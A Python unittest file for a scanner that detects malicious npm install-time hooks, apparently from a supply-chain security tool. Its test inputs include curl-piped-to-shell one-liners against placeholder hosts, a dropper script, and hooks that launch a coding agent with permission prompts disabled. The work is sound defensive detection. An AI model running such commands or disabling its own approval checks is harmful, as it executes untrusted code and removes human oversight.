#!/usr/bin/env python3
"""npm install-time lifecycle-hook execution signatures (#1090).

Detection + confidence + scoping-to-lifecycle-keys + allowlist, all against inert manifests.
"""
from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from stayawake.bots.security.models import INFECTED, SUSPICIOUS, CLEAN
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.targets import LocalRepoTarget, ScanOptions

SIGS = load_signatures()


def _scan_pkg(scripts, allow=None):
    d = Path(tempfile.mkdtemp())
    (d / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}), encoding="utf-8")
    return scan_target(LocalRepoTarget(d, "t", ScanOptions()), SIGS, allow or [])


class TestNpmLifecycle(unittest.TestCase):
    def test_preinstall_setup_bun_is_confirmed_infected(self):
        r = _scan_pkg({"preinstall": "node setup_bun.js"})
        self.assertIn("npm-lifecycle-dropper", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, INFECTED)

    def test_remote_fetch_piped_into_bun_is_confirmed(self):
        r = _scan_pkg({"postinstall": "curl -s https://x.invalid/y | bun -"})
        self.assertIn("npm-lifecycle-remote-fetch", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, INFECTED)

    def test_bun_smuggling_is_heuristic_suspicious(self):
        r = _scan_pkg({"install": "bunx some-tool"})
        ids = {f.signature_id for f in r.findings}
        self.assertIn("npm-lifecycle-exec", ids)
        self.assertNotIn("npm-lifecycle-dropper", ids)   # not the confirmed dropper
        self.assertEqual(r.verdict, SUSPICIOUS)          # heuristic only

    def test_only_lifecycle_keys_inspected_not_user_scripts(self):
        # A dropper under a NON-lifecycle key (only runs when a human types `npm run …`) is not
        # this vector, so it must NOT be flagged.
        r = _scan_pkg({"test": "node setup_bun.js", "myscript": "curl x | bun -"})
        self.assertEqual([f.signature_id for f in r.findings], [])
        self.assertEqual(r.verdict, CLEAN)

    def test_benign_lifecycle_hooks_are_clean(self):
        # Legit install hooks (husky, a plain node build) must NOT flag — bare `node` is not the
        # vector (native-module postinstall runs node routinely).
        r = _scan_pkg({"prepare": "husky install",
                       "postinstall": "node ./scripts/build.js", "test": "jest"})
        self.assertEqual([f.signature_id for f in r.findings], [])

    def test_allowlist_suppresses_by_signature(self):
        r = _scan_pkg({"preinstall": "node setup_bun.js"},
                      allow=[{"signature": "npm-lifecycle-dropper", "path_glob": "package.json"}])
        self.assertNotIn("npm-lifecycle-dropper", {f.signature_id for f in r.findings})

    def test_remote_fetch_still_detected_after_redos_bound(self):
        # The bounded remote-fetch shape (#1156) must be detection-identical: a real `curl … | sh`
        # one-liner still fires, including after a benign prefix. (ReDoS *timing* is guarded once, for
        # every security regex, in test_redos_safety.py — not re-duplicated per matcher.)
        r = _scan_pkg({"postinstall": "echo setup && curl -fsSL https://x.invalid/i.sh | sh"})
        self.assertIn("npm-lifecycle-remote-fetch", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, INFECTED)



class TestAnAgentRunUnattendedFromAnInstallHook(unittest.TestCase):
    """A flag whose whole function is to switch off the agent's "may I?" prompt, in a hook that
    runs on every consumer's `npm install`. The bank's line is why this is sound: the attacker
    passes a FLAG because they cannot edit the victim's configuration, so it arrives in delivered
    content and is never a setting the developer chose.
    """

    def test_the_approval_prompt_switched_off_is_confirmed(self):
        r = _scan_pkg({"postinstall": "npx claude --dangerously-skip-permissions -p 'ship it'"})
        self.assertIn("npm-lifecycle-agent-approval-disabled", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, INFECTED)

    def test_trusting_every_tool_is_the_same_finding(self):
        r = _scan_pkg({"preinstall": "pnpm dlx some-agent --trust-all-tools"})
        self.assertIn("npm-lifecycle-agent-approval-disabled", {f.signature_id for f in r.findings})

    def test_the_agent_is_not_resolved_by_name(self):
        """Decided AT THE FLAG. A program-name list closes 8 of 27 invocations and MIS-RESOLVES 19,
        and here the agent arrives behind npx, pnpm dlx, bunx, `sudo -E env` or any wrapper."""
        for cmd in ("sudo -E env CI=1 npx claude --dangerously-skip-permissions",
                    "bunx @vendor/agent --trust-all-tools",
                    "node ./tools/run.js --dangerously-skip-permissions"):
            with self.subTest(cmd=cmd):
                r = _scan_pkg({"postinstall": cmd})
                self.assertIn("npm-lifecycle-agent-approval-disabled",
                              {f.signature_id for f in r.findings})

    def test_the_unattended_flag_alone_is_heuristic_not_infected(self):
        """`--yolo` is a real word that collides with the YOLO model family, so it informs without
        driving an INFECTED verdict on its own."""
        r = _scan_pkg({"postinstall": "node agent.js --yolo"})
        ids = {f.signature_id for f in r.findings}
        self.assertIn("npm-lifecycle-agent-yolo", ids)
        self.assertNotIn("npm-lifecycle-agent-approval-disabled", ids)
        self.assertEqual(r.verdict, SUSPICIOUS)

    def test_a_flag_that_merely_starts_with_the_same_letters_is_not_a_match(self):
        """`\\b` does not hold between a space and a hyphen, so the obvious pattern matched NOTHING.
        The boundary that does work must still reject a longer flag that shares the prefix."""
        for cmd in ("yolo train model=yolov8n.pt",
                    "python detect.py --yolo-version v8",
                    "python detect.py --yolov8",
                    "./train --yolo_weights w.pt",
                    "node build.js --no-yolo",
                    "sass src/button--yolo.scss dist/"):     # a BEM modifier, not a flag
            with self.subTest(cmd=cmd):
                r = _scan_pkg({"postinstall": cmd})
                self.assertNotIn("npm-lifecycle-agent-yolo", {f.signature_id for f in r.findings})

    def test_a_longer_flag_sharing_the_prefix_does_not_drive_an_infected_verdict(self):
        """The boundary IS the false-positive control on the signature that drives INFECTED, and it
        had no pin: deleting both lookarounds left this whole module green, because every other test
        for it was a positive match."""
        for cmd in ("agentctl --dangerously-skip-permissions-off",
                    "agentctl --trust-all-tools-except-bash",
                    "agentctl --safe-mode=--trust-all-toolsX",
                    # A double hyphen inside a NAME, which BEM-style modifiers make ordinary in a
                    # JS project. Only the leading guard stops this one.
                    "node build.js --in src/setup--trust-all-tools.js",
                    "node build.js --in themes/dark--dangerously-skip-permissions.css"):
            with self.subTest(cmd=cmd):
                r = _scan_pkg({"postinstall": cmd})
                self.assertNotIn("npm-lifecycle-agent-approval-disabled",
                                 {f.signature_id for f in r.findings})
                self.assertNotEqual(r.verdict, INFECTED)

    def test_every_script_a_bare_install_runs_is_read(self):
        """Read from the installed runner, not from documentation: npm's own `install.js` runs
        `prepublish`, and arborist's `reify.js` runs the three dependency events whenever the tree
        changes. Four of the ten were unread, so renaming the hook bypassed every signature here."""
        for key in ("prepublish", "predependencies", "dependencies", "postdependencies"):
            with self.subTest(key=key):
                r = _scan_pkg({key: "npx claude --dangerously-skip-permissions"})
                self.assertIn("npm-lifecycle-agent-approval-disabled",
                              {f.signature_id for f in r.findings})

    def test_it_is_scoped_to_install_time_keys(self):
        """A developer's own `npm run agent` is not delivered content and does not run on install."""
        r = _scan_pkg({"agent": "npx claude --dangerously-skip-permissions"})
        self.assertNotIn("npm-lifecycle-agent-approval-disabled", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, CLEAN)


if __name__ == "__main__":
    unittest.main()